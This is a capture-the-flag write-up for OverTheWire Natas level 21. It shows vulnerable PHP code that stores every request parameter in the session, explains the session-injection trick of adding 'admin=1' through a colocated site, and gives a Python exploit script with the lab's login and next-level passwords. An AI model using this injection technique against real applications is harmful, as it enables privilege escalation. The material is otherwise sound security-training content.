# Writeup level 21
In this challenge we have two websites which are colocated. On the main page we can't do anything so lets hop on the second website and try our luck there.

**Source Code (2nd Website)**  

```php
<?  

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?> 
```
Okay so this is pretty simple actually because of the following part:  
```php
// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```
They basically allow us to inject our own key-value pairs and since we want to become admin, we have to put the key admin and value 1 into the session. For that we just have to create a key-value pair with submit where the value doesn't matter but I am going to set it to true and after that we put the admin-1 key-value pair in there. After we have edited that session we have to call the main website (with our modified session) again to get the credentials for the next level.

**Exploit**  

```python
import requests

url = "http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=true"
data={"submit": "true", "admin": "1"}

session = "igk26egtes25qcull2tf1tivg5"

cookies = {'PHPSESSID': session}
r = requests.post(url, cookies=cookies,data=data, auth=("natas21", "IFekPyrQXftziDEsUr3x21sYuahypdgJ"))
print(r.text)
url2 = "http://natas21.natas.labs.overthewire.org/index.php"
r2 = requests.get(url2, cookies=cookies, auth=("natas21", "IFekPyrQXftziDEsUr3x21sYuahypdgJ"))
print(r2.text)

# password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

The password is:  
chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
